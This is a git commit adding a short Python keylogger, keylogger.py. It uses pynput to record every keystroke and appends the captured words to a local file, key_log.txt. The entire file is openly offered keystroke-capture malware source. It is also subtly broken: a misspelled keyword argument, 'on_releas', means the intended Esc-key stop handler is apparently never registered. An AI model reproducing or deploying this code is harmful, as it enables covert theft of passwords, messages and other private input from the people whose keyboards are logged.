baea6881ffefa5c9d239e1891bd32635381dbdf4
jayant766 <73739820+jayant766@users.noreply.github.com>
2021-03-03 00:26:35 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,26 @@
+from pynput.keyboard import Key, Listener
+
+kl_filename = "key_log.txt"
+
+word = []
+
+def on_press(key):
+    if key != Key.space:
+        word.append(key)
+    else:
+        print(word)
+        with open(kl_filename, "a") as f:
+            for letter in word:
+                letter = str(letter).strip("'")
+                f.write(str(letter))
+            f.write(" ")
+        word.clear()
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_releas=on_release) as listener:
+    listener.join()
